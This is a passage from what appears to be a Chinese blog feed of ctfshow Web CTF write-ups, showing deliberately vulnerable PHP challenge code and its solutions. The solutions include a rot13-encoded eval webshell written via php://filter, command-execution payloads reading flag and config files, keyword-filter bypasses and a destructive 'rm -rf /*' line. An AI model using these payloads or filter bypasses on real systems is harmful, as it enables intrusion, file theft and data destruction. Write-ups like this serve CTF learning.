important\">&lt;?</span>cuc <span class=\"token function\">cucvasb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>#再对<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>cuc <span class=\"token function\">cucvasb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>进行UCS2编码转换得到?<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>uc</span> <span class=\"token attr-name\">cucvcsa(b;)</span><span class=\"token punctuation\">></span></span>?</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>#最后x 补位</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>#最终得到x?<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>uc</span> <span class=\"token attr-name\">cucvcsa(b;)</span><span class=\"token punctuation\">></span></span>?</pre></td></tr></table></figure><p><img data-src=\"https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407111602416-1849632067.png\" alt=\"\" /></p>\n<p>为何不用 <code>string.strip_tags</code>  呢？因为 rot13 转换的同样会被 <code>strip_tags</code>  方法给删除了，而 UCS-2 或 UCS-4 构造的也同样会被 <code>strip_tags</code>  方法给删除，这里需要找其他的编码方式进行构造。</p>\n<p><strong>rot13 payload:</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>content<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/write=string.rot13||/resource=shell.php</span></pre></td></tr></table></figure><p>其中 <code>&lt;?cuc @riny($_CBFG[pzq]);?&gt;</code>  为 <code>&lt;?php @eval($_post[cmd]);?&gt;</code>  的 rot13 加密结果 ( <code>@</code> 的作用为即使错误也执行)</p>\n<p>所以访问 <code>shell.php</code> , 然后 post 传入 <code>cmd=system('ls /');</code> , 查看源码发现有 <code>flag.txt</code> ，然后再 post 传入 <code>cmd=system('cat /flag.txt');</code></p>\n<p>对于 <code>system ('ls /')</code> ，加斜杠即访问 file system (或者说为根目录) 中的文件，不加斜杠即为当前目录下的文件</p>\n<h1 id=\"web-2\"><a class=\"anchor\" href=\"#web-2\">#</a> Web 2</h1>\n<p>题目代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$$$$$</span><span class=\"token punctuation\">&#123;</span><span class=\"token function\">key</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"HappyNewYear\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token delimiter important\">?></span></pre></td></tr></table></figure><p>一共涉及到了四个函数 <code>count()</code> , <code>extracy()</code> , <code>call_user_func()</code> , <code>key()</code></p>\n<p>**count (): ** 计算数组中的单元数目，或对象中的属性个数</p>\n<p><strong>extract()</strong>: 从数组中将变量导入到当前的符号表</p>\n<p><strong>call_user_func():</strong> 第一个参数 <code>callback</code>  是被调用的回调函数，其余参数是回调函数的参数。返回回调函数的返回值。</p>\n<p><strong>key()</strong>: 从关联数组中取得键名</p>\n<p>post 传入 <code>session_id=session_id</code></p>\n<p>cookie= <code>PHPSESSID=HappyNewYear</code></p>\n<h1 id=\"web-3\"><a class=\"anchor\" href=\"#web-3\">#</a> Web 3</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2022-01-16 15:42:02</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2022-01-24 22:14:02</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$key</span><span class=\"token operator\">=</span>  <span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"HappyNewYear\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"虎年大吉，新春快乐！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>弱类型比较</p>\n<p>只需解决 <code>call_user_func </code> 函数即可</p>\n<p>为了让后面等于，那么可以使用函数 <code>session_start</code> , 返回 bool 值</p>\n<h1 id=\"web-4\"><a class=\"anchor\" href=\"#web-4\">#</a> Web 4</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$key=  call_user_func(($_GET[1]));</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>file_put_contents($key, \"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span>\\<span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\");</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>die(\"虎年大吉，新春快乐！\");</pre></td></tr></table></figure><p>1=spl_autoload_extensions</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/d2cf6418694b28cf61e50bdb9a21519dc7a123eb.png\" alt=\"\" /></p>\n<p>注册好后，先访问 <code>.inc,.php</code> , 同时 post 命令， <code>1=system('ls');</code> , 只回显 <code>index.php</code>  那么访问根目录下的文件 <code>1=system('ls /');</code>  看到 <code>f1ag.txt</code>  再输入 <code>1=system('cat /f1ag.txt')</code> ，得到 flag</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/ca4ad134f882baa5980c36c06efd2c11c51ac995.png\" alt=\"\" /></p>\n",
            "tags": [
                "CTF",
                "ctfshow",
                "Web"
            ]
        },
        {
            "id": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E8%90%8C%E6%96%B0/",
            "url": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E8%90%8C%E6%96%B0/",
            "title": "萌新",
            "date_published": "2022-10-04T02:28:52.000Z",
            "content_html": "<p>常见的一些命令执行的语句</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>system()</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>passthru()</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>exec()</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>shell_exec()</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>popen()</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>proc_open()</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>pcntl_exec()</pre></td></tr></table></figure><p>各种绕过姿势，总结一下</p>\n<ol>\n<li>\n<p>构造 <code>?c=$a='sys';$b='tem';$d=$a.$b;$d('cat config.php');</code></p>\n</li>\n<li>\n<p>cat 绕过 <code>?c=system('ca&quot;&quot;t config.php')</code></p>\n</li>\n<li>\n<p>base64 绕过 <code>?c=$a = base64_decode('c3lzdGVt');$b=base64_decode('Y2F0IGNvbmZpZy5waHA=');$a($b);</code></p>\n</li>\n<li>\n<p>闭合 <code>?c=assert(base64_decode(%27c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp%27))?&gt;</code></p>\n</li>\n<li>\n<p>POST 传值</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?c&#x3D;echo &#96;$_POST [1]&#96;?&gt;</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>?c&#x3D;echo &#96;$_POST [1]&#96;;</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>然后通过 post 方式传入 1&#x3D;cat config.php</pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"萌新-隐写-4\"><a class=\"anchor\" href=\"#萌新-隐写-4\">#</a> 萌新 隐写 4</h1>\n<p>word 文件中的选项有隐藏文字这一选项，勾上能查看隐藏的文字</p>\n<h1 id=\"web-3\"><a class=\"anchor\" href=\"#web-3\">#</a> web 3</h1>\n<p>使用逻辑符绕过</p>\n<p><code>?id=10 || id=1000</code></p>\n<h1 id=\"web-4\"><a class=\"anchor\" href=\"#web-4\">#</a> web 4</h1>\n<p>使用字符串: <code>?id=&quot;1000&quot;</code></p>\n<h1 id=\"web-5\"><a class=\"anchor\" href=\"#web-5\">#</a> web 5</h1>\n<p>使用异或: <code>?id=328^672</code></p>\n<p>使用运算符绕过 <code>?id=~~1000</code></p>\n<h1 id=\"web-6\"><a class=\"anchor\" href=\"#web-6\">#</a> web 6</h1>\n<p>使用运算符绕过 <code>?id=~~1000</code></p>\n<h1 id=\"web-7\"><a class=\"anchor\" href=\"#web-7\">#</a> web 7</h1>\n<p>使用二进制绕过 1000 的二进制</p>\n<p>各进制的前缀</p>\n<ul>\n<li><strong>二进制：0b</strong></li>\n<li><strong>八进制：0O</strong></li>\n<li><strong>十进制：无前缀</strong></li>\n<li><strong>十六进制：0x</strong></li>\n</ul>\n<p>故构造 payload  <code>?id=0b1111101000</code></p>\n<h1 id=\"web-8\"><a class=\"anchor\" href=\"#web-8\">#</a> web 8</h1>\n<p>梗题</p>\n<p>弹窗中有 &quot;熟悉的一顿操作后，去了埃塞俄比亚&quot;</p>\n<p>去了那么远，那么极有可能是删库跑路 而删库跑路的命令为  <code>rm -rf /*</code></p>\n<h1 id=\"web-9\"><a class=\"anchor\" href=\"#web-9\">#</a> web 9</h1>\n<p>题目源码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># flag in config.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/system|exec|highlight/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>即包含  <code>system</code>  或  <code>exec</code>  或  <code>highlight</code>  才会执行  <code>eval</code>  函数</p>\n<p>而  <code>eval</code>  会将  <code>c</code>  作为 PHP 代码执行 这里只需显示  <code>config.php</code>  文件内容即可</p>\n<p>这里用到了  <code>highlight_file()</code>  函数  <code>highlight_file(string $filename, bool $return false);</code></p>\n<p>即代码高亮 filename 文件，若第二个参数是  <code>false</code> ，则打印输出文件，若  <code>true</code> ，则将其转换为字符串返回</p>\n<h1 id=\"web-10\"><a class=\"anchor\" href=\"#web-10\">#</a> web 10</h1>\n<p>绕过，采用字符串拼接</p>\n<p><code>?c=$a='sys';$b='tem';$d=$a.$b;$d('cat config.php');</code>  或</p>\n<p><code>?c=$a='high';$b='light_file';$d=$a.$b;$d('config.php');</code></p>\n<h1 id=\"web-11\"><a class=\"anchor\" href=\"#web-11\">#</a> web 11</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># flag in config.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/system|exec|highlight|cat/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><code>?c=passthru(‘tac config.php’);</code></p>\n<h1 id=\"web-12\"><a class=\"anchor\" href=\"#web-12\">#</a> web 12</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># flag in config.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/system|exec|highlight|cat|\\.|php|config/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><code>?c=passthru(‘tac confi*’);</code></p>\n<p><code>?c=$a=base64_decode(‘Y29uZmlnLnBocA==’);passthru(“more $a”);</code></p>\n<h1 id=\"web-13\"><a class=\"anchor\" href=\"#web-13\">#</a> web 13</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># flag in config.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/system|exec|highlight|cat|\\.|\\;|file|php|config/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>分号被过滤了，考虑到结束符隐藏有分号，那么用结束符  <code>&gt;?</code>  代替分号</p>\n<h1 id=\"web-14\"><a class=\"anchor\" href=\"#web-14\">#</a> web 14</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># flag in config.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/system|exec|highlight|cat|\\(|\\.|\\;|file|php|config/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span 